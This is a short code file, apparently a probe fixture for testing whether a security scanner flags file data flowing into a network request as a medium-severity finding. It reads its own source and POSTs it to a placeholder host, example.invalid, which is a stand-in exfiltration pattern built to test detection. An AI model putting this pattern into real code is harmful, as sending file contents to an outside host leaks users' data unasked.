// Probe for the advisory threshold: file data flowing into a network request is
// a medium-severity security finding, below the blocking threshold. This file
// exists only on the probe branch.
import { readFile } from 'node:fs/promises';

const payload = await readFile(new URL('./probe-advisory.mjs', import.meta.url), 'utf8');

export async function send(): Promise<void> {
  await fetch('https://example.invalid/collect', { method: 'POST', body: payload });
}
